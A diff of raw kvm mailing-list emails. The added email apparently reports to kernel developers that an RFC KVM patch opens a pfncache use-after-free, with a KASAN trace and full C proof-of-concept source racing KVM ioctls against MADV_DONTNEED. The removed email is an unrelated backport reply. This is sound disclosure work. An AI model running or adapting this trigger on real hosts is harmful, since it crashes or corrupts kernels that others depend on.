@@ -1,138 +1,295 @@
-Received: from us-smtp-delivery-124.mimecast.com (us-smtp-delivery-124.mimecast.com [170.10.133.124])
+Received: from xmbghk7.mail.qq.com (xmbghk7.mail.qq.com [43.163.128.54])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id EE26B2DEA68
-	for <kvm@vger.kernel.org>; Sat, 20 Jun 2026 05:40:35 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=pass smtp.client-ip=170.10.133.124
-ARC-Seal:i=2; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1781934037; cv=pass; b=ro8jPmN+F98lWAJJk1WLEQmqWiKs9ih+RwAzLdn6+mp7PD9B10nYxKobjCFcqTJVzQBhOJMle+u9CQ+EyGzl5Chjfj5QwGB3MtcfzuVzb1Z4TWHG+FnM/xk0OY64TeeO/q/tL/w7EfDMg75ExApAiJR9o6OD/QoSj4XigpObWkQ=
-ARC-Message-Signature:i=2; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1781934037; c=relaxed/simple;
-	bh=XVIrocMTbotto2Yn9Y6S6ITRcTskf67l19nQM1UMx8g=;
-	h=MIME-Version:References:In-Reply-To:From:Date:Message-ID:Subject:
-	 To:Cc:Content-Type; b=thByVjZr+sq4/Cs9fvBiwVkmdVuFsrqhgdJlW6+LecpUakWl0pHQei/p3juO0apWeePGvi7H4vkWD70g5J6KvHKE7/t0BJzklBTqhAe8cr+at9hE2Ky4YHHCIqbRsiiX7c6zmXFJZn3JII++gzYWM7d3nOv74LdEGwtKrHmqh44=
-ARC-Authentication-Results:i=2; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=redhat.com; spf=pass smtp.mailfrom=redhat.com; dkim=pass (1024-bit key) header.d=redhat.com header.i=@redhat.com header.b=KjibknvF; dkim=pass (2048-bit key) header.d=redhat.com header.i=@redhat.com header.b=gBs4L9WA; arc=pass smtp.client-ip=170.10.133.124
-Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=redhat.com
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=redhat.com
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id F1C1540D588;
+	Sun, 21 Jun 2026 00:02:50 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=43.163.128.54
+ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
+	t=1782000173; cv=none; b=XMI8pZFBuztUvV6c56TJPyuyJGKPTbcdr426ucEa59bFVksITyaKQwmlv7srmRq29bzNgMQtQJJ0yQN3ziyQDM5DnEpa5VNP2ot0YnZBcgV/nr9eamg55r7YZl1wiC4E+BNW4+eEUdLKyVqHZ6M3xFp4NdKzWqensnDwomwhu3Q=
+ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
+	s=arc-20240116; t=1782000173; c=relaxed/simple;
+	bh=HyKubDTu0Cyf1xKZy02ECMnsDNZoTq80wAa77x2Vp5Y=;
+	h=Message-ID:Date:MIME-Version:Subject:To:References:From:
+	 In-Reply-To:Content-Type; b=sGIMUEslxAuTYIPTK2u4AAkvPT+S122XlI9ecKFWkxDzmumAAi3mXK+QCt1wLc/7/t41OmqUL+ItT1BDYFoGSjlcniZmjRLNXC5S/lx3wd39f2BcZKFt0059NHG7r8UPTHmxW2WpbM5Kx72AqAjI5lcvE6kakYY1c0qYBu7fZk4=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=qq.com; spf=pass smtp.mailfrom=qq.com; dkim=pass (1024-bit key) header.d=qq.com header.i=@qq.com header.b=L2VjciTU; arc=none smtp.client-ip=43.163.128.54
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=qq.com
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=qq.com
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (1024-bit key) header.d=redhat.com header.i=@redhat.com header.b="KjibknvF";
-	dkim=pass (2048-bit key) header.d=redhat.com header.i=@redhat.com header.b="gBs4L9WA"
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=redhat.com;
-	s=mimecast20190719; t=1781934035;
-	h=from:from:reply-to:subject:subject:date:date:message-id:message-id:
-	 to:to:cc:cc:mime-version:mime-version:content-type:content-type:
-	 content-transfer-encoding:content-transfer-encoding:
-	 in-reply-to:in-reply-to:references:references;
-	bh=XVIrocMTbotto2Yn9Y6S6ITRcTskf67l19nQM1UMx8g=;
-	b=KjibknvFo4/4z1xCk5FSSqjxvM12B/2r4X9mkJTbdZFRHvx8JWBj4KG4A1thr6Rffc1rE+
-	9AZbtkllrEUJRaCu0stw3O5qoRRVVphYnd/5TTjiVfJf1VsEiQE/uF7ATISFQlGNRxM6Zl
-	tgIBCJqTq3lCSsDYIrIh23UCzMegL90=
-Received: from mail-wm1-f72.google.com (mail-wm1-f72.google.com
- [209.85.128.72]) by relay.mimecast.com with ESMTP with STARTTLS
- (version=TLSv1.3, cipher=TLS_AES_256_GCM_SHA384) id
- us-mta-324-CmLNR0QZOlWScdqczES1_A-1; Sat, 20 Jun 2026 01:40:33 -0400
-X-MC-Unique: CmLNR0QZOlWScdqczES1_A-1
-X-Mimecast-MFC-AGG-ID: CmLNR0QZOlWScdqczES1_A_1781934032
-Received: by mail-wm1-f72.google.com with SMTP id 5b1f17b1804b1-490b0682d2fso20655485e9.0
-        for <kvm@vger.kernel.org>; Fri, 19 Jun 2026 22:40:33 -0700 (PDT)
-ARC-Seal: i=1; a=rsa-sha256; t=1781934032; cv=none;
-        d=google.com; s=arc-20240605;
-        b=UrIjS5hXQ+xpXzQ/kzVsg1npljF5MyOs5CxQA11+iyG/9NXWWnILcO/kzPcPEoIm+G
-         6gomRX0B39Q8zBj1N+5VOf4Oi6Ez6PNJd7wz7pigtIC823x1uFFwWeM/jasfOel8f7zl
-         BE3DPmqYjmOTCSEh3zbrn8j/BHjmaUJoMSusjPl+BMks6q4orEbmwtp0rO+Ugw9IEE3o
-         dnR6H5RmitIoRR3rVArs7FN1dSegi3onL4mlFR2iaz9rDp8papczv1sfmU+Kfyir8yvI
-         2jlA/D4y3ROh0sz3Sb0x6ptVD/QxcSroxS5ks1oAHZRuMDhmtDo5gj9Xxx7/e2uPFg9i
-         6rMQ==
-ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20240605;
-        h=content-transfer-encoding:cc:to:subject:message-id:date:from
-         :in-reply-to:references:mime-version:dkim-signature;
-        bh=XVIrocMTbotto2Yn9Y6S6ITRcTskf67l19nQM1UMx8g=;
-        fh=3UX48qOLTv8rEUF1BLbBsFL4AXQ44GHyVHDlYPqtRYI=;
-        b=eCqcZxe3fqXoGM1yZPGMOzORp8cwheHtibQRss6KlJ+hJT8bEfuWzOzirlRlUUjNmd
-         7w7VR7SjfUc3Yzxa+XtU4S/DNEDHG/PRh6nrbTG44w7MSNFiEOPnNmzYZsiHuPQO8jOz
-         RhRuTu/MX8JaM0ulWRd72d+b+3MZIhXS0hSZQmUptEB7HdeRhfZ8T6cg+3wFvi6rAT8g
-         EXwUrDrYHXk1CkLG1FnpuZPFR5JAuAZx2HOmVuI2M6cU/Cq3vYGYepY87+0B8T6tqgL3
-         J0Dfs9bxOnF4G7Dgc1Nr3jhp40ayKP5b3pQqyXCdIItWz4K5McDhgamLskiRX98KGcw+
-         u5aA==;
-        darn=vger.kernel.org
-ARC-Authentication-Results: i=1; mx.google.com; arc=none
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=redhat.com; s=google; t=1781934032; x=1782538832; darn=vger.kernel.org;
-        h=content-transfer-encoding:cc:to:subject:message-id:date:from
-         :in-reply-to:references:mime-version:from:to:cc:subject:date
-         :message-id:reply-to;
-        bh=XVIrocMTbotto2Yn9Y6S6ITRcTskf67l19nQM1UMx8g=;
-        b=gBs4L9WAjY67fM9XLZT2WkkwmBtCXEmznn7Y2DUPlbjOUsspqFuiUEfxS+occMv/8h
-         kciRl78Uy9i1rCugWq65m3sv1Y7mwNzZNVIG/MS5AYRoiNEfMLEx+zTVauTaWS/SYMaz
-         DOcvUsLWMvC2BNKTs6SkNsXQTu1ugBWGiDyueFziEb8e4pfhJS5sG0XV1MiNqg2gkLk3
-         A7i8LedrvZk6ELL62INYp0Qa9berGsLXUvxpdZkCGN9zv05bwFtuKVKp5iuux8cecYog
-         INO59fxzjMw1PtcBYNlNVkwuFrjmauetQExL6DIEjmL9hTdy+nrcI4ncpr99D+kiTHTV
-         DTKA==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20251104; t=1781934032; x=1782538832;
-        h=content-transfer-encoding:cc:to:subject:message-id:date:from
-         :in-reply-to:references:mime-version:x-gm-gg:x-gm-message-state:from
-         :to:cc:subject:date:message-id:reply-to;
-        bh=XVIrocMTbotto2Yn9Y6S6ITRcTskf67l19nQM1UMx8g=;
-        b=jLCvATavl03FXL5iz0SDoj7bRr7QAoARVs67o96Ud7vusqZ/ZADCyU3vLJ8TXbJmkl
-         JJ1FPWmGHf9LqK62ZT8Gz0mt6YHrt2PYc4TbnY4d1wRAid5jNN1OKHX7h6WO9Qtr2lCK
-         +aSP+jcyvN5j5p+GQK3XzgPn1AK7jhknxIhZ//L+8C42Vl7n/r29cBBC21rlvLEacf9/
-         kK/Suqvx6LLNlVNq0ZwzU6QRL6vaIS8EkteiGlqsnwoU8UV1Z2b1ihGWZQRAXVjkGaBJ
-         4CuGAM3ahlAIs8K6TdgYXo1zwZQsETur/XLzjioyY4tCrHao7pzUOPEWfjMnmLWw5Jrg
-         FHUw==
-X-Forwarded-Encrypted: i=1; AFNElJ/u7qbE9saes4OlWY5DymQbjFbvEqw+1xLV9tbBrP+iRRwOUcmv77E57QfnW/1UQ7ygOZU=@vger.kernel.org
-X-Gm-Message-State: AOJu0YzjRTvSXL1QwRi+N6h0C34eijTqodOt7l1nXGA+3xeS4D78yEBL
-	psvLhjwXtugZaW24y++VJgAUbRqJrnLUHT8LeXDyfzgl05pyqPZ2LiSuttlMUb+2CBLfq3QpVyM
-	pPPqOC6Fb1S64t68QEQBX8AxrYflmOL1pYIcovZlTIg952kI098q756Kp5iYq1Hamofd03tHup9
-	A3woJVfZIVt4ccNhEDGJsxAhh88clI
-X-Gm-Gg: AfdE7cmu3tLJ9tYP+m930+87l9f5LI56Im7St+l97z3AdHwZdqqu1/5ZjddzaiZQcCX
-	UTnjG3NP5T1aRYewDv1b+txrDOKJ+wXVN3grvL99BcBeJjBk9/yjOVxCtLC0n8jU3vpAYmUKRQI
-	QvperkLEqUWl7RM3cxPijvkUBUPGGp7bnfaPFFoteL1rgFGkuH1Qkqrc/ZavzAk15SPKzP3IFFg
-	SgVnG1qL3NPxk0+be2wHYs297HmDU+ygqMYbRfMO8SIcH/4a7z4/5oGRdVbuc1xqMn+LU6f
-X-Received: by 2002:a05:600c:5020:b0:490:d946:47cf with SMTP id 5b1f17b1804b1-4923ef47d08mr108763505e9.4.1781934032092;
-        Fri, 19 Jun 2026 22:40:32 -0700 (PDT)
-X-Received: by 2002:a05:600c:5020:b0:490:d946:47cf with SMTP id
- 5b1f17b1804b1-4923ef47d08mr108763315e9.4.1781934031793; Fri, 19 Jun 2026
- 22:40:31 -0700 (PDT)
+	dkim=pass (1024-bit key) header.d=qq.com header.i=@qq.com header.b="L2VjciTU"
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=qq.com; s=s201512;
+	t=1782000168; bh=vybCqDg9hWmZlNrhFz29JdNO2ituUhIKv68GCKK1pIE=;
+	h=Date:Subject:To:References:From:In-Reply-To;
+	b=L2VjciTUQaPakfGZjn9TxPFCaiK97akAD4B6vblO2QYtVpoS7KNK/l4d3h9Lk0ja2
+	 0Mfh3bsHHaz01eZaA0if+Sm7/KMfM6yNhxY1T5G3bt523RfF2iTUbP1spW1lGk9lEV
+	 l/ywrVL1RiVhqn5Ukf04QG6JYyp2RghNaHMaNEWQ=
+Received: from [192.168.1.100] ([183.95.73.181])
+	by newxmesmtplogicsvrsza63-0.qq.com (NewEsmtp) with SMTP
+	id ADA4832; Sun, 21 Jun 2026 08:02:45 +0800
+X-QQ-mid: xmsmtpt1782000165ts5upz1q4
+Message-ID: <tencent_EFE0DC1B0750A4CB1C783F920F91CF10E309@qq.com>
+X-QQ-XMAILINFO: Nwte6vbuj0EqbknLZeEA4uc//0lXfg3aCZT28xlvppfzvfRWlcS17m5Mv2gmnM
+	 yDijvPooVf/2FSfVkWqbuVR4B6lQKTfdLQzfp/3lmlnYr55GHc1zdoenps6igG7+wnz0VELYEQTM
+	 /8e6Q4YtZCRzB83F8wnyyfd5RWqIrtV2efZLPqoButCTNfZA1j5zMPzv9NhP8HbWbybBzu1ClL98
+	 35sQomuc4SVH1lyY/DauVxfPJ2MbcrhS+fLrj0pubS0LkhX8uasdW1v4iV1eRzOU+AcPDrF0Jnsi
+	 uffGkxJW0OevkWmfWJ6tlqnHq4OKXjn8QIceLhsWQnLYHi8yAbApjBdXMBz/K6veY/13d5vjwQ1n
+	 WsmyK0jizKud5tdMvlpsUFjGhpS2sIxzc6FfIksFsTxRZlJ02F4BQ0230IXXPpPn2vVPxXbcKZY2
+	 GkyuQnt49LKiSJNvVWnOC27q2/1awSHyo2X2hIPvUoeRSSnaSnATTlMnlb8NYJMISWrR8qZmbxb8
+	 y37fvr6Xzms2A8N3jsKZ4I9JqJfaQVK88ynLr6XylkTHQupj9HwlZrJP1TBPtScCS1IHUbzsEoeI
+	 jYlK5cyDwGLs26M0sPILMeCwKDFUAgzBtoLcBVoT/y4V97pZq1afnLuHOhN5OsLosGcTwP+TyJGt
+	 Ni7e/ZTdAaRVNPAANXK5CQCNvlUro+HzSylBQYy/ZGFDKJ9K9+NpPCMCqqrjJi8lJ4w43cBY7cYR
+	 Gse+RGbXFQ+Fn5oLJfZgZRKievzzUDMHlHarzLhHXkA6QNcqURmcnKOwkIBVk39L10gulYmh7xlB
+	 McL/vMhpcPV6ECBYqcCU0Nr+rc3K7u6SBxsb8vA3Myvx5ehGHZfA7CNu+zOUKp3OmiB0NEnDCBXW
+	 iOenuq/yrrSJ257zWmw4/SNXAaZyHrW2KnqjJUfhpXip+6sz6shAhskTXGWxIxE6pwD0xpUfFGjm
+	 Y87B21fcqpCL3TZHeiu4292tyHcuiIqVOlxkIAbu5nqzYBxzpY0hfFOfv8ISjN5QxjU7Gz/6wxmr
+	 iGYXyUwgxDM5qajlmPmIWhWlxarJ6RPa4hRNhhOa6H/hOETGSI
+X-QQ-XMRINFO: MSVp+SPm3vtSI1QTLgDHQqIV1w2oNKDqfg==
+X-OQ-MSGID: <4babccaf-90b5-4bf6-8f82-7e5677fef024@qq.com>
+Date: Sun, 21 Jun 2026 08:02:45 +0800
 Precedence: bulk
 X-Mailing-List: kvm@vger.kernel.org
 List-Id: <kvm.vger.kernel.org>
 List-Subscribe: <mailto:kvm+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:kvm+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
-References: <20260503201029.106481-1-pbonzini@redhat.com> <62bedd23-a9d8-4c05-bf39-662c2d37b793@redhat.com>
- <ahlQQlD1ygfiQ3bG@dev-dsk-doebel-1a-7b355d76.us-east-1.amazon.com>
-In-Reply-To: <ahlQQlD1ygfiQ3bG@dev-dsk-doebel-1a-7b355d76.us-east-1.amazon.com>
-From: Paolo Bonzini <pbonzini@redhat.com>
-Date: Sat, 20 Jun 2026 07:40:18 +0200
-X-Gm-Features: AVVi8Cc9pgh_rugpxF92QHP0_KXWWdqXna6GpieKRqAEmkG8WgK-gTKAo9E9NdU
-Message-ID: <CABgObfawkiKRDz0to=oCjo1vygVAkHyZXAzpsLWT2GXwkszV_A@mail.gmail.com>
-Subject: Re: stable backports for "KVM: x86: Fix shadow paging use-after-free
- due to unexpected GFN"
-To: Bjoern Doebel <doebel@amazon.de>
-Cc: linux-kernel@vger.kernel.org, kvm@vger.kernel.org, 
-	Sean Christopherson <seanjc@google.com>, Alexander Bulekov <bkov@amazon.com>, 
-	Fred Griffoul <fgriffo@amazon.co.uk>, stable@vger.kernel.org, zcgao@amazon.com
-Content-Type: text/plain; charset="UTF-8"
-Content-Transfer-Encoding: quoted-printable
+User-Agent: Mozilla Thunderbird
+Subject: Re: [RFC PATCH] KVM: Ignore MMU notifiers for guest_memfd-only
+ memslots
+To: Alexandru Elisei <alexandru.elisei@arm.com>, pbonzini@redhat.com,
+ kvm@vger.kernel.org, linux-kernel@vger.kernel.org, maz@kernel.org,
+ oupton@kernel.org, suzuki.poulose@arm.com, kvmarm@lists.linux.dev,
+ linux-arm-kernel@lists.infradead.org, seanjc@google.com,
+ david.hildenbrand@arm.com, mark.rutland@arm.com
+References: <20260615155244.183044-1-alexandru.elisei@arm.com>
+From: XIAO WU <xiaowu.417@qq.com>
+In-Reply-To: <20260615155244.183044-1-alexandru.elisei@arm.com>
+Content-Type: text/plain; charset=UTF-8; format=flowed
+Content-Transfer-Encoding: 8bit
 
-On Fri, May 29, 2026 at 10:39=E2=80=AFAM Bjoern Doebel <doebel@amazon.de> w=
-rote:
->
-> Hi Paolo,
->
-> On Tue, May 05, 2026 at 12:13:34PM +0200, Paolo Bonzini wrote:
-> > I'll get to testing and sending them out, but it will take a while; if
-> > anybody wants to help testing, I can provide my tentative patches.
->
-> took us a while, but if you are still looking for help, my friend Nathan
-> and I would volunteer to test these in the context of Amazon Linux.
+Hi
+
+I came across the Sashiko review in this thread and wanted to see if
+the pfncache UAF could be triggered in practice.  The short answer is:
+yes, it reproduces reliably with a multi-threaded PoC.  Below is the
+KASAN report and a brief description of the reproducer.
+
+On Mon, Jun 15, 2026 at 04:52:44PM +0100, Alexandru Elisei wrote:
+ > For guest_memfd-only memslots (kvm_memslot_is_gmem_only() is true), the
+ > memory provider for the virtual machine is the guest_memfd file, not the
+ > userspace mapping.
+...
+ > @@ -592,6 +592,10 @@ static __always_inline kvm_mn_ret_t 
+kvm_handle_hva_range(struct kvm *kvm,
+ >              unsigned long hva_start, hva_end;
+ >
+ >              slot = container_of(node, struct kvm_memory_slot, 
+hva_node[slots->node_idx]);
+ > +
+ > +            if (kvm_slot_has_gmem(slot) && 
+kvm_memslot_is_gmem_only(slot))
+ > +                continue;
+ > +
+
+This `continue` is the problem.  When the only memslot covering the
+HVA range is gmem-only, found_memslot stays false, and in
+invalidate_range_end, kvm_mmu_invalidate_end() is never called.
+That means mmu_invalidate_seq never increments.
+
+Meanwhile, the pfncache (used for guest pvclock) runs this retry
+protocol in hva_to_pfn_retry():
+
+     1. Capture mmu_seq
+     2. Drop gpc->lock
+     3. GUP + kmap (gets a page reference, creates kernel mapping)
+     4. kvm_release_page_clean(page) — drops the reference
+     5. Re-acquire gpc->lock
+     6. mmu_notifier_retry_cache() — checks if mmu_seq changed
+
+If step 6 sees the same seq, the stale kmap is kept even though the
+page was freed after step 4.  This is the UAF.
+
+[Reproduction]
+
+I rebuilt the kernel with CONFIG_KASAN=y and ran the PoC in a QEMU VM.
+The trigger is three threads racing concurrently:
+
+   - Thread 1 (T0): hammers KVM_RUN ioctls, forcing
+     kvm_guest_time_update → kvm_gpc_refresh → hva_to_pfn_retry
+   - Thread 2 (T1): cycles KVM_SET_MSRS to activate/deactivate the
+     pvclock pfncache, extending the race window
+   - Thread 3 (T2): hammers MADV_DONTNEED + write on the HVA, firing
+     MMU notifier invalidations while the memslot is gmem-only
+
+The full PoC source (poc.c) is attached at the end of this mail.
+Compiled with: gcc -o poc poc.c -static -lpthread
+
+[KASAN report — kernel 7.1.0-g0eb81d7f81ae #1, CONFIG_KASAN=y]
+
+   ==================================================================
+   BUG: KASAN: use-after-free in kvm_setup_guest_pvclock+0x632/0x680
+   Read of size 4 at addr ffff888116069000 by task poc/9520
+
+   CPU: 1 UID: 0 PID: 9520 Comm: poc Not tainted 7.1.0-g0eb81d7f81ae #1
+
+   Call Trace:
+    <TASK>
+    dump_stack_lvl+0x116/0x1f0
+    print_report+0xf4/0x600
+    kasan_report+0xe0/0x110
+    kvm_setup_guest_pvclock+0x632/0x680
+    kvm_guest_time_update+0x741/0x1090
+    vcpu_run+0x1c2a/0x5a80
+    kvm_arch_vcpu_ioctl_run+0x1029/0x18d0
+    kvm_vcpu_ioctl+0x772/0x1710
+    __x64_sys_ioctl+0x193/0x210           ← KVM_RUN
+    do_syscall_64+0x129/0x880
+    entry_SYSCALL_64_after_hwframe+0x77/0x7f
+
+   The buggy address belongs to the physical page:
+   page: refcount:0 mapcount:0 mapping:0000000000000000 index:0x7ff24ab46
+
+   page last allocated via:
+    get_user_pages_unlocked → hva_to_pfn → __kvm_gpc_refresh
+      → kvm_gpc_refresh → kvm_setup_guest_pvclock
+
+   page last free pid 9520 tgid 9517 stack trace:
+    kvm_release_page_clean → __folio_put → __free_frozen_pages
+      ← __kvm_gpc_refresh ← kvm_gpc_refresh
+
+The allocation and free traces confirm the exact scenario from the
+review: the page is allocated by GUP during gpc refresh, then freed by
+kvm_release_page_clean() inside the same __kvm_gpc_refresh() call,
+and then kvm_setup_guest_pvclock still accesses it through the stale
+kmap.
+
+The crash reproduces within ~40 seconds of the PoC running.
+
+[Full PoC source]
+
+Compile: gcc -o poc poc.c -static -lpthread
+
+// SPDX-License-Identifier: GPL-2.0-only
+/*
+  * PoC for: KVM MMU notifier skip regression for guest_memfd-only memslots
+  *
+  * Concurrent threads create a race between gpc refresh (GUP → kmap →
+  * kvm_release_page_clean → retry check) and MMU invalidation (munmap /
+  * MADV_DONTNEED) on a gmem-only memslot where the invalidation doesn't
+  * increment mmu_invalidate_seq.
+  */
+#define _GNU_SOURCE
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <errno.h>
+#include <signal.h>
+#include <stdint.h>
+#include <sys/ioctl.h>
+#include <sys/mman.h>
+#include <pthread.h>
+#include <linux/kvm.h>
+
+#ifndef KVM_CAP_GUEST_MEMFD
+#define KVM_CAP_GUEST_MEMFD 234
+#endif
+#ifndef GUEST_MEMFD_FLAG_MMAP
+#define GUEST_MEMFD_FLAG_MMAP (1ULL << 0)
+#endif
+#ifndef MSR_KVM_SYSTEM_TIME_NEW
+#define MSR_KVM_SYSTEM_TIME_NEW 0x4b564d01
+#endif
+
+#define PAGE_SIZE 4096
+
+static volatile bool stop = false;
+static int vcpu_fd = -1;
+static unsigned long shared_hva = 0;
+
+static void sigint_handler(int sig) { stop = true; }
+
+static void *worker_thread(void *arg)
+{
+     int tid = (int)(long)arg;
+     for (int i = 0; !stop && i < 200000; i++) {
+         if (tid == 0)
+             ioctl(vcpu_fd, KVM_RUN, 0);
+         else if (tid == 1) {
+             struct kvm_msrs *msrs = malloc(sizeof(*msrs) + 
+sizeof(msrs->entries[0]));
+             if (msrs) {
+                 memset(msrs, 0, sizeof(*msrs) + sizeof(msrs->entries[0]));
+                 msrs->nmsrs = 1;
+                 msrs->entries[0].index = MSR_KVM_SYSTEM_TIME_NEW;
+                 msrs->entries[0].data = (i & 1) ? 0x1001 : 0x1000;
+                 ioctl(vcpu_fd, KVM_SET_MSRS, msrs);
+                 free(msrs);
+             }
+         } else {
+             madvise((void*)shared_hva, PAGE_SIZE, MADV_DONTNEED);
+             *(volatile char*)shared_hva = 0x42;
+         }
+         if (i % 50000 == 0)
+             printf("[T%d] %d iterations\n", tid, i);
+     }
+     printf("[T%d] Done\n", tid);
+     return NULL;
+}
+
+int main(void)
+{
+     signal(SIGINT, sigint_handler);
+     signal(SIGTERM, sigint_handler);
+
+     int kvm_fd = open("/dev/kvm", O_RDWR);
+     int vm_fd = ioctl(kvm_fd, KVM_CREATE_VM, 0);
+
+     struct kvm_create_guest_memfd gmem_cmd = { .size = PAGE_SIZE, 
+.flags = GUEST_MEMFD_FLAG_MMAP };
+     int gmem_fd = ioctl(vm_fd, KVM_CREATE_GUEST_MEMFD, &gmem_cmd);
+
+     void *anon = mmap(NULL, PAGE_SIZE, PROT_READ|PROT_WRITE,
+                       MAP_PRIVATE|MAP_ANONYMOUS|MAP_POPULATE, -1, 0);
+     memset(anon, 0xAA, PAGE_SIZE);
+     shared_hva = (unsigned long)anon;
+
+     struct kvm_userspace_memory_region2 mem = {
+         .slot = 0, .flags = KVM_MEM_GUEST_MEMFD,
+         .guest_phys_addr = 0x1000, .memory_size = PAGE_SIZE,
+         .userspace_addr = shared_hva,
+         .guest_memfd_offset = 0, .guest_memfd = gmem_fd,
+     };
+     ioctl(vm_fd, KVM_SET_USER_MEMORY_REGION2, &mem);
+
+     vcpu_fd = ioctl(vm_fd, KVM_CREATE_VCPU, 0);
+     size_t mmap_size = ioctl(kvm_fd, KVM_GET_VCPU_MMAP_SIZE, 0);
+     struct kvm_run *vcpu_run = mmap(NULL, mmap_size, PROT_READ|PROT_WRITE,
+                                     MAP_SHARED, vcpu_fd, 0);
+
+     /* Pre-activate pfncache via MSR */
+     struct kvm_msrs *msrs = malloc(sizeof(*msrs) + 
+sizeof(msrs->entries[0]));
+     memset(msrs, 0, sizeof(*msrs) + sizeof(msrs->entries[0]));
+     msrs->nmsrs = 1;
+     msrs->entries[0].index = MSR_KVM_SYSTEM_TIME_NEW;
+     msrs->entries[0].data = 0x1001;
+     ioctl(vcpu_fd, KVM_SET_MSRS, msrs);
+     free(msrs);
+
+     pthread_t threads[3];
+     for (int i = 0; i < 3; i++)
+         pthread_create(&threads[i], NULL, worker_thread, (void *)(long)i);
+
+     sleep(40);
+     stop = true;
+     for (int i = 0; i < 3; i++)
+         pthread_join(threads[i], NULL);
+
+     printf("[*] Done. Check dmesg for KASAN UAF.\n");
+     return 0;
+}
 
 Thanks,
+XIAOWU
 
-I placed everything in the linux-5.10.y and linux-5.15.y branches of
-https://git.kernel.org/pub/scm/virt/kvm/kvm.git, adding also a couple
-more issues that were fixed in the last merge window.
-
-Paolo
 
